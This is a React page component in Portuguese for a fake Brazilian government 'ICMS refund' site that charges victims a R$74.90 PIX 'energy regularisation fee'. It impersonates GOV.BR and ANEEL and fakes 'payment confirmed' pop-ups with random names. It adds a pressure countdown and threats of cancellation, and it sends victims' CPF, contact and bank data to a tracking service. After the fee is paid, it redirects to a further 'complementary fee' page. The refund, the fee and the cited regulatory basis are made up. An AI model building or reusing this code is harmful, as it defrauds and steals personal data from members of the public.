import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, CheckCircle, Info, AlertCircle, AlertTriangle, Bell, Loader, Landmark, ArrowRight } from "lucide-react";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { Toaster } from "@/components/ui/toaster";
import { playNotificationSound } from "@/components/NotificationSound";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { notifyPixGenerated, notifyPaymentConfirmed } from "@/lib/utmify";

// Gerar um código PIX aleatório
const gerarCodigoPix = () => {
  const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let codigo = "";
  for (let i = 0; i < 32; i++) {
    codigo += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return codigo.match(/.{1,4}/g)?.join(" ") || "";
};

// Nomes para as notificações
const nomes = [
  "Pedro", "Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Júlia", 
  "Rafael", "Mariana", "Bruno", "Camila", "Diego", "Isabela", "Gustavo", 
  "Letícia", "Henrique", "Amanda", "Felipe", "Natália", "Ricardo", "Larissa",
  "Rodrigo", "Carla", "Alexandre", "Beatriz", "Eduardo", "Vanessa", "Marcelo", "Bianca"
];

// Componente de notificação
interface NotificacaoProps {
  nome: string;
  valor: string;
  onClose: () => void;
}

const Notificacao = ({ nome, valor, onClose }: NotificacaoProps) => {
  return (
    <div className="w-full bg-white shadow-sm rounded-md border border-gray-100 overflow-hidden animate-fade-in">
      <div className="flex items-start p-3">
        <div className="flex-shrink-0">
          <div className="h-8 w-8 rounded-full bg-green-50 flex items-center justify-center">
            <CheckCircle className="h-4 w-4 text-green-600" />
          </div>
        </div>
        <div className="ml-3 flex-1">
          <p className="text-sm font-medium text-gray-700 flex items-center">
            <span className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></span>
            Pagamento confirmado
          </p>
          <p className="mt-1 text-sm text-gray-600 leading-tight">
            <span className="font-medium">{nome}</span> acabou de pagar a Taxa de Regularização Energética e irá receber <span className="font-medium text-green-600">{valor}</span>
          </p>
        </div>
        <button
          className="ml-3 flex-shrink-0 text-gray-400 hover:text-gray-500 focus:outline-none"
          onClick={onClose}
        >
          <span className="sr-only">Fechar</span>
          <svg className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
            <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
          </svg>
        </button>
      </div>
    </div>
  );
};

// Formatar um valor monetário
const formatarValor = (valor: number) => {
  return valor.toLocaleString('pt-BR', { 
    style: 'currency', 
    currency: 'BRL' 
  });
};

// Interface para as informações do pagamento da API
interface PaymentInfo {
  id: string;
  pixCode: string;
  pixQrCode: string;
  expiresAt: string;
  status: string;
}

// Componente principal da página
export default function PagamentoPix() {
  const [location, navigate] = useLocation();
  const { toast } = useToast();
  
  // Obter parâmetros da URL
  const urlParams = new URLSearchParams(window.location.search);
  
  // Dados da restituição
  const cpf = urlParams.get('cpf') || "";
  const nome = urlParams.get('nome') || "";
  
  // Corrigir a formatação do valor - converter centavos para reais
  let valor = 0;
  const valorParam = urlParams.get('valor') || "0";
  if (valorParam) {
    // Se o valor for maior que 10.000, provavelmente está em centavos
    // e precisa ser convertido para reais
    const valorNumerico = parseFloat(valorParam);
    valor = valorNumerico > 10000 ? valorNumerico / 100 : valorNumerico;
  }
  
  const companhia = urlParams.get('companhia') || "CEMIG Distribuição";
  const estado = urlParams.get('estado') || "Minas Gerais";
  const dataNascimento = urlParams.get('nasc') || "21/07/2003";
  const bancoNome = urlParams.get('bancoNome') || "Banco do Brasil";
  
  const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
  const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
  const valorFormatado = formatarValor(valor);
  const valorTaxaFormatado = formatarValor(74.90);
  const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  
  // Estados relacionados ao pagamento
  const [isLoading, setIsLoading] = useState(false);
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<string>('pending');
  const [codigoPix, setCodigoPix] = useState('');
  const [copied, setCopied] = useState(false);
  
  // Estado para as notificações
  const [notificacoes, setNotificacoes] = useState<{ id: number; nome: string; valor: string }[]>([]);
  
  // Estado para o contador regressivo (20 minutos = 1200 segundos)
  const [tempoRestante, setTempoRestante] = useState(1200);
  
  // Gerar um valor aleatório para notificações
  const gerarValorAleatorio = () => {
    const valor = 1800 + Math.random() * 1200; // Entre 1800 e 3000
    return formatarValor(valor);
  };
  
  // Função para gerar uma notificação
  const gerarNotificacao = () => {
    const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
    const valorAleatorio = gerarValorAleatorio();
    
    // Gera um ID único com timestamp + número aleatório para evitar colisões
    const id = Date.now() + Math.floor(Math.random() * 10000);
    setNotificacoes(prev => [...prev, { id, nome: nomeAleatorio, valor: valorAleatorio }]);
  };
  
  // Remover uma notificação
  const removerNotificacao = (id: number) => {
    setNotificacoes(prev => prev.filter(notif => notif.id !== id));
  };
  
  // Copiar o código PIX
  const copiarCodigoPix = () => {
    // Não modificar o código PIX, copiar exatamente como veio da API
    navigator.clipboard.writeText(codigoPix);
    setCopied(true);
    toast({
      title: "Código copiado!",
      description: "O código PIX foi copiado para a área de transferência.",
    });
    
    setTimeout(() => setCopied(false), 3000);
  };
  
  // Formatar o tempo do contador (mm:ss)
  const formatarTempo = (segundos: number) => {
    const minutos = Math.floor(segundos / 60);
    const segs = segundos % 60;
    return `${minutos.toString().padStart(2, '0')}:${segs.toString().padStart(2, '0')}`;
  };
  
  // Criar pagamento PIX
  const criarPagamento = async () => {
    try {
      setIsLoading(true);
      
      // Chamar a API para criar um pagamento com todos os parâmetros necessários
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          nome: nome,
          cpf: cpf,
          email: email,
          telefone: telefone,
          valor: 74.90 // Valor fixo da Taxa TRE
        })
      });

      if (!response.ok) {
        throw new Error('Falha ao gerar o pagamento');
      }

      const payment = await response.json();
      setPaymentInfo(payment);
      setCodigoPix(payment.pixCode);
      
      // Enviar informação para UTMify sobre o PIX gerado
      try {
        await notifyPixGenerated(
          payment.id,
          cpf,
          nome,
          email,
          telefone,
          7490 // valor em centavos (R$ 74,90)
        );
        console.log("Notificação UTMify enviada com sucesso - PIX gerado");
      } catch (utmifyError) {
        console.error("Erro ao enviar notificação para UTMify:", utmifyError);
        // Não interrompe o fluxo principal se houver erro na integração com UTMify
      }
    } catch (error) {
      console.error('Erro ao criar pagamento:', error);
    } finally {
      setIsLoading(false);
    }
  };

  // Verificar status do pagamento
  const verificarStatusPagamento = async () => {
    if (!paymentInfo?.id) return;
    
    setIsLoading(true);
    console.log("[VerificaçãoPIX] Verificando status do pagamento:", paymentInfo.id);
    
    try {
      const response = await fetch(`/api/pagamentos/${paymentInfo.id}/status`);
      
      if (response.ok) {
        const data = await response.json();
        console.log("[VerificaçãoPIX] Status recebido da API:", data.status);
        
        // Atualizar o estado com o status atual
        setPaymentStatus(data.status);
        
        // Somente redirecionar se o status for realmente 'completed'
        if (data.status === 'completed' || data.status === 'COMPLETED' || data.status === 'PAID' || data.status === 'paid') {
          console.log("[VerificaçãoPIX] Pagamento CONFIRMADO. Preparando redirecionamento...");
          
          toast({
            title: "Pagamento confirmado!",
            description: "Seu pagamento foi processado com sucesso. Redirecionando...",
            variant: "default"
          });
          
          // Enviar informação para UTMify sobre o pagamento confirmado
          try {
            await notifyPaymentConfirmed(
              paymentInfo.id,
              cpf,
              nome,
              email,
              telefone,
              7490 // valor em centavos (R$ 74,90)
            );
            console.log("[VerificaçãoPIX] Notificação UTMify enviada com sucesso - Pagamento confirmado");
          } catch (utmifyError) {
            console.error("[VerificaçãoPIX] Erro ao enviar notificação para UTMify:", utmifyError);
            // Não interrompe o fluxo principal se houver erro na integração com UTMify
          }
          
          // Preparar parâmetros para o redirecionamento
          const params = new URLSearchParams({
            cpf: cpf,
            nome: nome,
            valor: valor.toString(),
            pagamentoId: paymentInfo.id,
            dataPagamento: new Date().toISOString(),
            companhia: companhia,
            estado: estado,
            nasc: dataNascimento,
            agencia: urlParams.get('agencia') || "",
            conta: urlParams.get('conta') || "",
            email: email,
            telefone: telefone
          });
          
          // Redirecionar para a página de taxa complementar após confirmação real
          console.log("[VerificaçãoPIX] Redirecionando para a página de taxa complementar");
          setTimeout(() => {
            navigate(`/taxa-complementar?${params.toString()}`);
          }, 1500);
        } else {
          console.log("[VerificaçãoPIX] Pagamento ainda pendente:", data.status);
        }
      } else {
        console.error("[VerificaçãoPIX] Resposta da API não foi OK:", response.status);
      }
    } catch (error) {
      console.error('[VerificaçãoPIX] Erro ao verificar status do pagamento:', error);
    } finally {
      setIsLoading(false);
    }
  };

  // Efeito para criar o pagamento quando a página carregar
  useEffect(() => {
    criarPagamento();
  }, []);

  // Efeito para verificar o status do pagamento periodicamente
  useEffect(() => {
    if (!paymentInfo?.id) return;
    
    // Verificação inicial
    verificarStatusPagamento();
    
    // Configurar intervalo para verificar a cada 10 segundos
    const statusInterval = setInterval(() => {
      verificarStatusPagamento();
    }, 10000); // Verificar a cada 10 segundos
    
    return () => {
      clearInterval(statusInterval);
    };
  }, [paymentInfo]);

  // Efeito para o contador regressivo
  useEffect(() => {
    // Contador regressivo
    const timerInterval = setInterval(() => {
      setTempoRestante(prev => {
        if (prev <= 1) {
          clearInterval(timerInterval);
          toast({
            title: "Tempo esgotado!",
            description: "O tempo para pagamento da TRE expirou.",
            variant: "destructive",
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(timerInterval);
    };
  }, []);
  
  // Efeito separado apenas para o sistema de notificações
  // Isso ajuda a evitar problemas de re-renderização causando múltiplas notificações
  useEffect(() => {
    // Referência para os timeouts que vamos limpar no unmount
    const timeoutRefs: NodeJS.Timeout[] = [];
    
    // Limpar notificações anteriores
    setNotificacoes([]);
    
    // Função recursiva para criar o ciclo de notificações
    function criarCicloNotificacoes(tempoInicial: number) {
      // 1. Agendar aparecimento da notificação
      const notificationTimeout = setTimeout(() => {
        // Tocar o som de notificação
        playNotificationSound();
        
        // Criar uma notificação
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
        const valorAleatorio = gerarValorAleatorio();
        const id = Date.now();
        
        // Adicionar a notificação ao estado
        setNotificacoes([{ id, nome: nomeAleatorio, valor: valorAleatorio }]);
        
        // 2. Agendar remoção da notificação após 5 segundos
        const removalTimeout = setTimeout(() => {
          // Remover a notificação
          setNotificacoes([]);
          
          // 3. Agendar próxima notificação após 7 segundos do desaparecimento
          criarCicloNotificacoes(7000);
        }, 5000);
        
        // Guardar a referência para limpar no unmount
        timeoutRefs.push(removalTimeout);
        
      }, tempoInicial);
      
      // Guardar a referência para limpar no unmount
      timeoutRefs.push(notificationTimeout);
    }
    
    // Iniciar o primeiro ciclo após 7 segundos
    criarCicloNotificacoes(7000);
    
    // Limpar todos os timeouts no unmount para evitar memory leaks
    return () => {
      timeoutRefs.forEach(timeout => clearTimeout(timeout));
    };
  }, []);

  return (
    <>
      <Header />
      <main className="container mx-auto px-2 py-4 min-h-screen">
        {/* Este componente é necessário para o toast */}
        <Toaster />
        
        {/* Notificações flutuantes - Aparecem centralizadas no topo */}
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 w-full max-w-md space-y-2 flex flex-col items-center">
          {notificacoes.map((notif) => (
            <Notificacao
              key={notif.id}
              nome={notif.nome}
              valor={notif.valor}
              onClose={() => removerNotificacao(notif.id)}
            />
          ))}
        </div>
        
        <div className="p-3 sm:p-4 relative bg-gray-50 rounded-lg shadow-md w-full mx-auto">
          <div className="bg-[#1351B4] text-white p-4 rounded-md mb-5 shadow-sm">
            <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-3">
              <div className="text-left">
                <div className="flex items-center mb-1">
                  <Landmark className="mr-2 h-5 w-5 text-white" />
                  <h3 className="font-bold text-lg">Restituição de ICMS</h3>
                </div>
                <div className="bg-[#0C4DA2] text-white text-xs px-2 py-1 rounded inline-flex items-center">
                  <Info size={12} className="mr-1" />
                  Protocolo nº {cpf.substring(0,4)}4714{cpf.substring(6,9)}
                </div>
              </div>
              <div className="text-right bg-[#0C4DA2] rounded-md p-3">
                <p className="font-medium text-white text-sm mb-1">Taxa de Regularização:</p>
                <p className="font-bold text-lg text-white">{valorTaxaFormatado}</p>
                <div className="flex items-center justify-end mt-1 text-xs text-white">
                  <AlertCircle size={12} className="mr-1" />
                  <span>Vencimento: <span className="font-medium">{formatarTempo(tempoRestante)}</span></span>
                </div>
              </div>
            </div>
          </div>
          
          <div className="mb-6">
            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
              <div className="bg-white/20 p-1.5 rounded-md mr-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              </div>
              DADOS DO SOLICITANTE
            </div>
            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <div className="mb-4">
                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Nome completo</p>
                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{nome}</p>
                  </div>
                  <div className="mb-4">
                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">CPF</p>
                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{cpfFormatado}</p>
                  </div>
                  <div>
                    <p className="mb-1 text-xs font-medium text-gray-500 uppercase tracking-wide">Companhia Elétrica</p>
                    <p className="font-semibold text-gray-800 bg-gray-50 p-2 rounded-md border border-gray-100">{companhia}</p>
                  </div>
                </div>
                <div>
                  <div className="p-4 bg-amber-50 border-l-4 border-amber-400 rounded-r-md mb-4 shadow-sm">
                    <p className="text-amber-800 font-medium text-sm mb-1 flex items-center">
                      <AlertTriangle size={16} className="mr-1.5" />
                      Situação da solicitação:
                    </p>
                    <p className="text-red-600 font-bold flex items-center">
                      <span className="inline-block w-2 h-2 bg-red-600 rounded-full mr-2 animate-pulse"></span>
                      PENDENTE - AGUARDANDO PAGAMENTO
                    </p>
                  </div>
                </div>
              </div>
            </div>
            
            <div className="bg-[#1351B4] text-white py-3 px-4 rounded-t-md font-semibold text-sm flex items-center">
              <div className="bg-white/20 p-1.5 rounded-md mr-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                </svg>
              </div>
              DETALHES DA RESTITUIÇÃO
            </div>
            <div className="border border-t-0 border-gray-200 rounded-b-md p-5 bg-white shadow-sm mb-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-gradient-to-br from-red-50 to-red-100 rounded-lg shadow-sm p-4 border border-red-200">
                  <div className="flex items-center mb-2">
                    <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-red-800 uppercase tracking-wide">Taxa de Regularização</p>
                      <p className="font-bold text-red-600 text-lg">{valorTaxaFormatado}</p>
                    </div>
                  </div>
                  <p className="text-xs text-red-800 mt-2 pl-11">Pagamento único para liberação da restituição</p>
                </div>
                
                <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-lg shadow-sm p-4 border border-green-200">
                  <div className="flex items-center mb-2">
                    <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-green-800 uppercase tracking-wide">Valor aprovado</p>
                      <p className="font-bold text-green-600 text-lg">{valorFormatado}</p>
                    </div>
                  </div>
                  <p className="text-xs text-green-800 mt-2 pl-11">Valor total a ser depositado</p>
                </div>
                
                <div className="bg-gradient-to-br from-amber-50 to-amber-100 rounded-lg shadow-sm p-4 border border-amber-200">
                  <div className="flex items-center mb-2">
                    <div className="w-8 h-8 bg-amber-500 rounded-full flex items-center justify-center mr-3">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-4 w-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                    </div>
                    <div>
                      <p className="text-xs font-medium text-amber-800 uppercase tracking-wide">Prazo de pagamento</p>
                      <p className="font-bold text-amber-600 text-lg">{formatarTempo(tempoRestante)}</p>
                    </div>
                  </div>
                  <p className="text-xs text-amber-800 mt-2 pl-11">Tempo restante para realizar o pagamento</p>
                </div>
              </div>
            </div>
          </div>
          
          <div className="flex flex-col md:flex-row gap-4 mb-6">
            <div className="flex-1 bg-white border border-gray-200 rounded-lg shadow-sm p-5">
              <h3 className="font-semibold text-lg mb-3">Escaneie o código PIX abaixo:</h3>
              
              <div className="flex flex-col items-center mb-4">
                <div className="bg-white p-4 border border-gray-200 rounded-md shadow-sm mb-4 w-56 h-56 flex items-center justify-center">
                  {isLoading ? (
                    <div className="flex flex-col items-center space-y-2">
                      <Loader className="animate-spin h-8 w-8 text-gray-400" />
                      <span className="text-sm text-gray-500">Gerando código PIX...</span>
                    </div>
                  ) : paymentInfo?.pixQrCode ? (
                    <img 
                      src={paymentInfo.pixQrCode} 
                      alt="QR Code PIX" 
                      className="max-w-full max-h-full object-contain" 
                    />
                  ) : (
                    <div className="text-center text-gray-500">
                      <AlertTriangle className="h-10 w-10 mx-auto mb-2" />
                      <p>Não foi possível gerar o QR Code PIX</p>
                    </div>
                  )}
                </div>
              </div>
              
              <div>
                <div className="rounded-md bg-gray-50 border border-gray-200 p-3 mb-4">
                  <div className="flex justify-between items-center mb-2">
                    <p className="text-sm font-medium text-gray-700">Código PIX (Copiar e colar)</p>
                    <Button 
                      variant="outline" 
                      size="sm" 
                      className="h-8 text-xs"
                      onClick={copiarCodigoPix}
                      disabled={isLoading || !codigoPix}
                    >
                      {copied ? (
                        <div className="flex items-center">
                          <CheckCircle className="h-4 w-4 mr-1 text-green-600" />
                          Copiado
                        </div>
                      ) : (
                        <div className="flex items-center">
                          <Copy className="h-4 w-4 mr-1" />
                          Copia e Cola
                        </div>
                      )}
                    </Button>
                  </div>
                  <div className="rounded-md bg-white border border-gray-200 p-2 overflow-x-auto">
                    <p className="text-xs font-mono text-gray-600 whitespace-nowrap">
                      {isLoading ? (
                        <span className="text-gray-400">Gerando código PIX...</span>
                      ) : codigoPix ? (
                        codigoPix
                      ) : (
                        <span className="text-red-400">Erro ao gerar código PIX. Tente novamente.</span>
                      )}
                    </p>
                  </div>
                </div>
                
                <Button 
                  className="w-full bg-[#1351B4] font-medium hover:bg-[#0C4DA2] transition mb-4" 
                  onClick={verificarStatusPagamento}
                  disabled={isLoading || !paymentInfo?.id}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center">
                      <Loader className="mr-2 h-5 w-5 animate-spin" />
                      Verificando Pagamento...
                    </div>
                  ) : (
                    <div className="flex items-center justify-center">
                      <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                      </svg>
                      Já fiz o pagamento
                    </div>
                  )}
                </Button>

                {/* Botão para avançar manualmente para a próxima página */}
                <Button 
                  variant="outline"
                  className="w-full bg-amber-50 border-amber-300 text-amber-800 hover:bg-amber-100 hover:text-amber-900 mb-4"
                  onClick={() => {
                    // Preparar parâmetros para o redirecionamento
                    const params = new URLSearchParams({
                      cpf: cpf,
                      nome: nome,
                      valor: valor.toString(),
                      pagamentoId: paymentInfo?.id || "manual",
                      dataPagamento: new Date().toISOString(),
                      companhia: companhia,
                      estado: estado,
                      nasc: dataNascimento,
                      agencia: urlParams.get('agencia') || "",
                      conta: urlParams.get('conta') || "",
                      email: email,
                      telefone: telefone
                    });
                    
                    toast({
                      title: "Redirecionando...",
                      description: "Você será redirecionado para a próxima etapa.",
                      variant: "default"
                    });
                    
                    // Redirecionar para a página de taxa complementar
                    setTimeout(() => {
                      navigate(`/taxa-complementar?${params.toString()}`);
                    }, 1000);
                  }}
                >
                  <div className="flex items-center justify-center">
                    <ArrowRight className="mr-2 h-5 w-5" />
                    Avançar para próxima etapa
                  </div>
                </Button>
                
                <div className="bg-red-600 p-4 rounded-lg text-white shadow-sm">
                  <div className="flex items-center mb-2">
                    <AlertTriangle className="h-5 w-5 text-white mr-2" />
                    <h3 className="font-bold text-base">NOTIFICAÇÃO OFICIAL</h3>
                  </div>
                  <p className="mb-3 text-sm">
                    Ao prosseguir, você concordou com o pagamento da Taxa de Regularização no valor de <strong>{valorTaxaFormatado}</strong>. 
                    O não pagamento resultará em <strong>cancelamento automático</strong> da sua solicitação.
                  </p>
                  <div className="bg-white/10 p-2 rounded-md">
                    <p className="font-medium text-sm text-center">
                      Efetue o pagamento em até <span className="font-bold">{formatarTempo(tempoRestante)}</span> 
                      <br className="md:hidden" /> para garantir sua restituição de <strong>{valorFormatado}</strong>
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
          
          {/* Seção de Garantia de Segurança - Simplificada */}
          <div className="mb-4">
            <div className="border border-green-100 bg-green-50 rounded-md p-3 shadow-sm">
              <div className="flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 text-green-700 mr-2 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                </svg>
                <h3 className="font-semibold text-green-800">GARANTIA DE SEGURANÇA</h3>
              </div>
              
              <div className="text-sm text-green-700 mt-2 grid grid-cols-1 md:grid-cols-3 gap-2">
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Conformidade com a LGPD</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Tecnologia GOV.BR</span>
                </div>
                <div className="flex items-center">
                  <CheckCircle className="h-4 w-4 text-green-600 mr-1.5" />
                  <span>Sistema nacional de restituição</span>
                </div>
              </div>
            </div>
          </div>
          
          {/* Seção de Perguntas Frequentes - Mantemos abaixo após a Garantia */}
          <div>
            <div className="bg-[var(--gov-blue-dark)] text-white py-2 px-3 rounded-t-md font-semibold text-sm">PERGUNTAS FREQUENTES</div>
            <div className="border border-t-0 border-gray-300 rounded-b-md p-4 bg-white mb-4">
              <div className="space-y-4">
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">1. O que é a Taxa de Regularização Energética (TRE)?</h3>
                  <p className="text-sm text-gray-600">
                    A TRE é uma taxa administrativa que cobre os custos de processamento e regularização do seu pedido de restituição de valores cobrados indevidamente nas faturas de energia elétrica.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">2. Por que preciso pagar a TRE?</h3>
                  <p className="text-sm text-gray-600">
                    Conforme a resolução normativa ANEEL nº 1.000/2021, a taxa é necessária para cobrir os custos operacionais e administrativos do processo de restituição, incluindo verificação, processamento e transferência bancária.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">3. Quanto tempo leva para receber minha restituição?</h3>
                  <p className="text-sm text-gray-600">
                    Após a confirmação do pagamento da TRE, o valor da sua restituição será depositado na conta bancária informada em até 3 dias úteis.
                  </p>
                </div>
                
                <div className="border-b border-gray-200 pb-4">
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">4. Por que preciso fazer o pagamento via PIX?</h3>
                  <p className="text-sm text-gray-600">
                    O PIX foi escolhido como método de pagamento por sua rapidez, segurança e rastreabilidade. Isso permite que sua restituição seja processada de forma mais ágil.
                  </p>
                </div>
                
                <div>
                  <h3 className="font-medium text-[var(--gov-blue-dark)] mb-2">5. O que acontece se eu não pagar a TRE no prazo?</h3>
                  <p className="text-sm text-gray-600">
                    Se o pagamento não for realizado dentro do prazo estabelecido, sua solicitação será automaticamente cancelada e você precisará iniciar um novo processo de solicitação de restituição.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}